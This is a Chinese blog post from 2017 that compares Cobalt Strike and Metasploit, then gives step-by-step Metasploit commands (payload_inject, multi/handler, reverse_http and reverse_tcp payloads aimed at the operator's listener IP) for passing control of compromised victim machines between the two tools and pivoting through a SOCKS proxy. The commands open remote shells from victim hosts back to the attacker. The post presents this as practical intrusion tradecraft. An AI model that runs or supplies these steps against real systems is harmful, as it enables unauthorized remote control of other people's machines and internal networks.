---
title: cs和msf的区别
date: 2017-09-12 14:27:24
tags:
	- 渗透
categories: 渗透
---


### 首先介绍一下Cobalt Strike
**Cobalt Strike是一款以metasploit为基础的GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。**

这是以前的了，Cobalt Strike以前是一个MSF的GUI版本，现在翅膀硬了，2.5版本以后就已经脱离的msf的框架自己重写了，当然两兄弟间还互相提供接口支持（主要还是cobalt strike支持metasploit）。

### 在这里先给出我自己对最新Cobalt Strike与MetaSploit的看法。

Cobalt Strike与metasploit以前曾是GUI版本与命令行版本的关系，现在脱离自己重写后，个人觉得Cobalt Strike更偏重于稳定控制，而MetaSploit偏向于横向渗透。MetaSploit在渗透个人机方面作用比较小，而Cobalt Strike相对作用会更大一些。所以Cobalt Strike与metasploit现在是一种***互补***的关系。

---
#### 下文CS代表Cobalt Strike，MSF代表metasploit
列举一下cs与msf之间对比的优缺点吧，在CS的视角中来谈：

1. CS的socks4a服务比msf稳定太多了，被控机器从CS上线后，可以使用CS中的socks4a协议进行代理渗透，实战端口扫描开200线程不会挂，而msf中的route add或者是socks4a都做不到（这里数据感谢碧波大神），具体操作由于本人懒，这里先不写了。
2. CS没有横向EXP攻击：说白了CS只是个功能强大的远控马，它自从脱离了msf自己重写框架后，就放弃了exploit，专心做远控。所以使用cs前，你必须得获得目标机器的权限，再从上面运行cs的马。

本文便是基于2号缺点来展开，现在拿cs日站，前提就是你获取了目标的权限，然后运行cs的马上线，然后通过cs进行代理（或者其它扫描等），进行内网渗透，找出漏洞后继续利用其它工具进行exploit，exploit后再运行cs的马，这其中过程中，其实cs并没有很好地配合起来，并且好像也没有msf什么事情。如果我们要使用msf配合cs一起进行渗透的话，国内无文章对此进行介绍。经过我这两天的实验，发现msf对cs的支持还是很好的。

---
在使用msf和cs配合的渗透中，可能会有如下场景：
- msf获得了一个meterpreter的session，想把session传给cs
- msf未获得meterpreter的session，想直接让目标给cs上线
- cs获得了一个上线机器，想把这个机器丢给msf中的meterpreter获得一个session进行控制
- cs获得了一个上线机器，想把这个机器丢给msf中继续进行渗透

下面便来聊聊这4点是如何实际操作的。

本文网络环境如下：受害机器IP：192.168.31.14    MSF和cs在同一个IP下：192.168.31.29

---
#### 1. msf获得了一个meterpreter的session，想把session传给cs：

思路是使用msf中的inject payload来做

现在先假设已有一个meterpreter的session了，步骤如下：

在cs中新建监听

点击save创建成功后我们便有了一个reverse_http监听者，监听者33890端口，等待被控机连接。

此时切换到meterpreter中，输入下列命令：


```
background # 切换到后台

use exploit/windows/local/payload_inject

set payload windows/meterpreter/reverse_http # 这里有个坑，不能使用x64的payload，我开始试验了很久一直失败，发现是x64的原因，换成x86的payload就好了

set lhost 192.168.31.29 # cs的服务端IP

set lport 33890 # 监听者的监听端口

set session 1 # 这里是之前meterpreter的session编号

set disablepayloadhandler true # 关闭payload的监听，因为msf和cs在同一台机器，而且这里用cs监听而不是msf

exploit
```

此时机器便已成功从cs成功上线。

---
#### 2. msf未获得meterpreter的session，想直接让目标给cs上线
cs先开启监听者（见上文），此时msf的payload按照如下写法即可

```
set payload windows/meterpreter/reverse_http

set lhost 192.168.31.29 # cs的服务端IP

set lport 33890
```
就可以了，简单吧。这里其实就是payload选择reverse_http（注意32位的，不是64位的，这里大坑），然后监听的地址和端口写cs的监听者的信息就可以了，生成payload后怎么让目标执行就不在本文讨论范围了

---
#### 3. cs获得了一个上线机器，想把这个机器丢给msf中的meterpreter获得一个session进行控制
步骤如下

msf中：

```
use exploit/multi/handler 

set payload windows/meterpreter/reverse_tcp # 再次强调大坑：不要用x64的payload！

set lhost 192.168.31.29 

set lport 9999

exploit # 开启监听
```


cs中，对目标机器点击右键，spawn，新建一个监听者，payload选择foreign/reverse_tcp

最后choose它就可以了，如果meterpreter没有马上获得shell，不要着急，因为cs中默认sleep是1分钟，你可以先提前把sleep改短些，这样cs的反应会快些。

---

#### 4. cs获得了一个上线机器，想把这个机器丢给msf中继续进行渗透

这里其实只需要cs开一个socks给msf用就行了，具体操作如下：

对上线机器点右键，开启socks4a，然后会给你一个地址，在msf中设置proxy即可

